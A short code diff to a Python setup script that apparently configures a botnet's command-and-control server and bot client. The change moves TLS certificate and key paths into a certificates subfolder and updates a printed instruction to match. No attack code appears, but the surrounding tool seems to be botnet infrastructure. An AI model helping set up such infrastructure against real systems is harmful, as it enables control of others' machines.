@@ -413,8 +413,8 @@ def update_bot_main_go(
 def generate_certificates(cnc_path: str, cert_config: dict) -> bool:
     """Generate TLS certificates"""
     try:
-        key_path = os.path.join(cnc_path, "server.key")
-        cert_path = os.path.join(cnc_path, "server.crt")
+        key_path = os.path.join(cnc_path, "./certificates/server.key")
+        cert_path = os.path.join(cnc_path, "./certificates/server.crt")
 
         # Generate private key
         info("Generating 4096-bit RSA private key...")
@@ -774,7 +774,7 @@ def run_full_setup(base_path: str, cnc_path: str, bot_path: str):
         f"{Colors.DIM}   TLS certs are required. You can self-sign here or use Let's Encrypt/your own.{Colors.RESET}"
     )
     print(
-        f"{Colors.DIM}   Place your own certs at: cnc/server.crt and cnc/server.key{Colors.RESET}\n"
+        f"{Colors.DIM}   Place your own certs at: cnc/certificates/server.crt and cnc/certificates/server.key{Colors.RESET}\n"
     )
 
     print(f"  {Colors.BRIGHT_GREEN}[1]{Colors.RESET} Generate self-signed certificates")
